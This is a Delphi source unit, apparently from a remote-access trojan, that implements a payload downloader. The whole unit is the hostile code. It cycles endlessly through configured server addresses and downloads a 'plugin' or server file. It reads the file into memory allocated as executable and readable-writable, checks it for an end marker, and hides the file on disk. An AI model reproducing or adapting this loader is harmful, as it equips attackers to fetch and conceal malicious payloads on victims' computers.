unit UnitGetServer;

interface

uses
  windows,
  StrUtils,
  functions,
  UnitConfigs;

var
  PluginOK: boolean = False;
  ObterServerEnderecos: array [0..NUMMAXCONNECTION - 1] of WideString;
  DownloadPlugin: boolean;
  PluginLink: pWideChar;
  ServerBufferFileName: pWideChar;
  ServerBuffer: Pointer;
  ServerBufferSize: int64;

function StartObterServidor(Dados: pointer): DWORD; stdcall;
function ObterServidor(Endereco: pWideChar): boolean;

implementation

function ObterServidor(Endereco: pWideChar): boolean;
var
  p: pointer;
  hFile, lpNumberOfBytesRead: Cardinal;
  TempStr: WideString;
begin
  ServerBuffer := nil;
  ServerBufferSize := 0;

  result := false;

  if DownloadPlugin = True then
  begin
    if FileExists(ServerBufferFileName) = False then
      DownloadToFile(PluginLink, ServerBufferFileName);
  end;

  if FileExists(ServerBufferFileName) = False then
    DownloadToFile(Endereco, ServerBufferFileName);

  if FileExists(ServerBufferFileName) = True then
  begin
    SetFileAttributesW(ServerBufferFileName, FILE_ATTRIBUTE_NORMAL);

    hFile := CreateFileW(ServerBufferFileName, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
    if hFile <> INVALID_HANDLE_VALUE then
    begin
      ServerBufferSize := GetFileSize(hFile, nil);

      //GetMem(ServerBuffer, Size);
      ServerBuffer := VirtualAlloc(nil, ServerBufferSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

      SetFilePointer(hFile, 0, nil, FILE_BEGIN);
      ReadFile(hFile, ServerBuffer^, ServerBufferSize, lpNumberOfBytesRead, nil);

      SetLength(TempStr, ServerBufferSize div 2);
      CopyMemory(@TempStr[1], ServerBuffer, ServerBufferSize);

      result := posex('ENDSERVERBUFFER', Tempstr) > 0;

      if result = false then
      begin
        DeleteFileW(ServerBufferFileName);
        ServerBuffer := nil;
        ServerBufferSize := 0;
      end;
    end;
    CloseHandle(hFile);

  end;
end;

function StartObterServidor(Dados: pointer): DWORD; stdcall;
var
  i: integer;
begin
  i := 0;
  PluginOK := False;
  while true do
  begin
    if Length(ObterServerEnderecos[i]) > 0 then
    if ObterServidor(pWideChar(ObterServerEnderecos[i])) = true then Break;
    inc(i);
    if i >= NUMMAXCONNECTION then i := 0;
    sleep(1000);
  end;

  Result := 0;
  if FileExists(ServerBufferFileName) then
  begin
    HideFileName(ServerBufferFileName);
    PluginOK := True;
  end;
end;

end.